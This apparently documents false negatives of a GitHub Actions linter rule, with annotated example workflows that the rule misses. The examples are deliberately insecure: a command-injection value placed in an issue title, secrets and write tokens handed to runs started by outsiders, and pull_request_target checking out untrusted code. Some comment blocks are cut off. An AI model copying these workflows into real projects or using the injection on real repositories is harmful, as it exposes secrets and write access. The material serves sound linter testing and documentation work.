  - disposition: todo (needs: same-file)
  - added attackers: triage-account, writer-pull-requests-token, app-installation-token
  - example: .github/workflows/labeled.yml (workflow, undetected)
    ```yaml

    #   with a personal access token; the configuration .github/labeler.yml adds
    #   the label safe-to-test to a pull request that changes a file under site/;

    # attack-run-behavior: the attacker opens a pull request from a fork that
    #   changes a file under site/; when labeler.yml runs on schedule,

        types: [labeled]
    permissions: {}
    jobs:
      build:
        if: github.event.label.name == 'safe-to-test'
        runs-on: ubuntu-latest
        env:
    ```

- remote-caller: a reusable workflow called from another repository: the caller's events, token and secrets are not seen
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: limitation (decided by: remote-caller)
  - example: remote-caller.yml (workflow, undetected)
    ```yaml
    # situation: a reusable workflow with write-all gives a secret to a run.
    # reason: a limitation (decided by remote-caller): the rule reads the
    #   events that each workflow given to the linter names in on, and a
    #   workflow_call run has the event of the run of the caller. A caller in
    #   the repository is a job of a workflow given to the linter, and the rule
    #   reads the job of that caller. A caller of another repository is not in
    #   the files given to the linter, so the events, the token and the secrets
    #   that the caller gives are not known.
    # cause: workflow_call is none of the privileged events, and no
    #   caller in the input calls it.
    # attack: a workflow of another repository calls this one on an event the
    #   attacker triggers, such as issues, and a flaw in that run executes their
    #   code.
    # attack-run-behavior: the call runs the job a with the caller's token,
    #   which permissions: write-all does not raise past what the caller gave,
    #   and with DEPLOY_KEY as the caller passes it; ./deploy runs with it in
    #   K.
    on: workflow_call
    permissions: write-all
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - run: ./deploy
            env:
              K: ${{ secrets.DEPLOY_KEY }}
    ```
- id-token: a job with id-token write and no other: code run there takes an OIDC token for the clouds that trust the repository
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: same-file)
  - example: id-token.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a job has id-token write alone.
    # reason: a todo (the same file): code run here takes an OIDC token for the
    #   clouds that trust the repository.
    # cause: the analysis of the token counts id-token write as no write.
    # attack: the attacker opens an issue, and a flaw in the job's steps runs
    #   their code there (the step here runs only echo).
    # attack-run-behavior: the issue starts the job a with id-token: write,
    #   which puts ACTIONS_ID_TOKEN_REQUEST_URL and
    #   ACTIONS_ID_TOKEN_REQUEST_TOKEN in its environment; with them, code there
    #   requests an OIDC token for the repository, which a cloud that trusts the
    #   repository exchanges for credentials.
    on: issues
    permissions:
      id-token: write
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - run: echo
    ```
- watch: a job on watch: anyone can star the repository, and the run has its secrets, but the event carries no value of the attacker's, so it is not counted among the attacker's events
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: same-file)
  - example: watch.yml (workflow, undetected)
    ```yaml
    # situation: on watch, a job with write-all gives a secret to a run.
    # reason: a todo (the same file): a star triggers it on the default branch
    #   with the repository's secrets, but carries no value of the attacker's.
    # cause: it is not read as one of the privileged events.
    # attack: the attacker stars the repository.
    # attack-run-behavior: the star starts the job a on the default branch with
    #   a token that writes every scope; ./deploy runs with K set to
    #   DEPLOY_KEY's value, and no value of the attacker's reaches the step.
    on: watch
    permissions: write-all
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - run: ./deploy
            env:
              K: ${{ secrets.DEPLOY_KEY }}
    ```
- gollum: a job on gollum, which an attacker triggers only where anyone may edit the wiki (repo.wiki-open)

  - disposition: todo (needs: fact)

    ```yaml
    # reason: a todo (a fact): an edit of the wiki triggers it, only where
    ```

    ```yaml
    #   write runs.
    # reason: a todo (a pin update): an activity type GitHub added after the
    ```

- insider-association: an if that lets in MEMBER or COLLABORATOR by the author_association of the issue, the pull request or the discussion the run is of, which the following pass: a member or a collaborator whose repository role is Read only, who gets, in the run, a token that writes and the secrets, more than what the Read role gives; the account of such a member or collaborator, taken over; and an outsider who becomes a MEMBER with the Read role, in an organization that lets anyone become a member (a bot that invites whoever asks). A member or a collaborator whose role is Triage or above holds a credential that can add a label or write to the repository, which the credential premise assumes no attacker holds. Who is a member, and with what role, is not in the workflow
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: fact)
  - added attackers: read-member, triage-account, writer-issues-token, required-reviewer
  - example: insider-association.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a job whose if lets in an issue whose
    #   author_association is MEMBER has contents write and writes the issue's
    #   title in a run.
    # reason: a todo (a fact): a member of the organization, who may have read
    #   access only, passes this if (in an organization that lets anyone become a
    #   member, such as by a bot that invites whoever asks, an outsider becomes such
    #   a member), and gets the job's token and secrets past what the Read role
    #   gives; who is a member, and with what role, is not in the workflow.
    # cause: the rule evaluates the if with the attacker's author_association
    #   (NONE, FIRST_TIMER, FIRST_TIME_CONTRIBUTOR or CONTRIBUTOR), for which it
    #   is false, so no attacker's event runs the job.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: an issue whose author is a member of the
    #   organization has author_association MEMBER, so the if is true and the
    #   job a starts with contents: write; the script becomes echo ""; echo
    #   PWNED; echo "", and echo PWNED runs as a command. An outsider's issue
    #   makes the if false.
    on: issues
    jobs:
      a:
        if: github.event.issue.author_association == 'MEMBER'
        runs-on: ubuntu-latest
        permissions:
          contents: write
        steps:
          - run: echo "${{ github.event.issue.title }}"
    ```
- remote-callee: a job or a step inside a reusable workflow of another repository (uses: owner/repo/.github/workflows/&lt;file>@&lt;ref>) whose content the fact workflow.definition does not give. For every rule: a run that does not ask the fact (a run without --online and without the answer in --facts). For a quality rule, also: a run where the linter asked the fact and got no answer (an answer of unknown: the GitHub API did not give the file), and a call deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact. The rule reads a reusable workflow of another repository only from the answer of workflow.definition. For a rule that is not a quality rule (a rule with a threat), the last two forms are the inconclusive kind remote-callee-unknown, not this form
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: fact)
  - example: remote-callee.yml (workflow, undetected)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/dangerous-triggers-unanswered, whose content
    #   is the workflow of the true positive token-write (token-write.yml) of
    #   the rule, with on: workflow_call in place of the on of token-write.yml.
    #   The linter has no answer of the fact workflow.definition for the
    #   reusable workflow.
    # reason: a todo (a fact): the jobs of a reusable workflow run on the event
    #   that started the run of the calling job, and the linter does not read
    #   the reusable workflow.
    # cause: the rule reads a reusable workflow of another repository only from
    #   the answer of workflow.definition.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: opening the issue starts the job a, which has no if
    #   and waits for no approval, with a token that has contents: write; the
    #   script becomes echo ""; echo PWNED; echo "", and the shell runs echo
    #   PWNED as a command, so any command the attacker writes in its place runs
    #   in the job that holds that token.
    on: issues
    permissions: {}
    jobs:
      c:
        uses: example-org/dangerous-triggers-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```
- combined-credentials: a job that runs only when a label is added to a pull request (pull_request_target with the activity type labeled), whose if needs both a label and the author_association MEMBER or COLLABORATOR of the author of the pull request, in a run of the linter that adds read-member and writer-pull-requests-token or app-installation-token, and does not add triage-account: one attacker who holds both credentials opens the pull request from the account with the read role and adds the label with the token, and the job runs for the pull request of the attacker in the same way that the job runs for a pull request after a person who can add labels adds the label to approve the pull request. A run that adds triage-account reports the job, as an account with the triage role both has the author_association MEMBER or COLLABORATOR and adds a label

  - disposition: todo (needs: same-file)
  - added attackers: triage-account
  - example: combined-credentials.yml (workflow, undetected)

    ```yaml
    #   whose if needs the label safe-to-test and the author_association MEMBER
    #   of the author of the pull request has a GITHUB_TOKEN that may write (no

    #   the head of the pull request with allow-unsafe-pr-checkout, and runs
    #   make test.
    # reason: a todo (more analysis by the linter): one attacker who holds
    #   both an account with the read role and a token of a writer with the

    #   writer-pull-requests-token) opens the pull request from the account,
    #   whose author_association is MEMBER, and adds the label with the token,
    #   and the job runs with its token on the pull request of the attacker.
    # cause: the linter runs the rules once for each added attacker alone, and
    #   reads each added attacker as a separate attacker: the run that adds
    #   read-member does not let the attacker add a label, and the run that
    #   adds writer-pull-requests-token reads the author of the pull request
    #   as an outsider. A run that adds triage-account reports the job, as an
    #   account with the triage role both has the author_association MEMBER
    #   and adds a label.

    # attack-run-behavior: the member account opens a pull request from a fork,
    #   the token adds the label safe-to-test, the if is true, the checkout
    #   fetches head.sha, and make runs the target test of the pull request,
    #   which pushes with the GITHUB_TOKEN of the job that may write.
    on:
      pull_request_target:
        types: [labeled]
    jobs:
      test:
        if: contains(github.event.pull_request.labels.*.name, 'safe-to-test') && github.event.pull_request.author_association == 'MEMBER'
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
            with:
              ref: ${{ github.event.pull_request.head.sha }}
              allow-unsafe-pr-checkout: true
          - run: make test
    ```
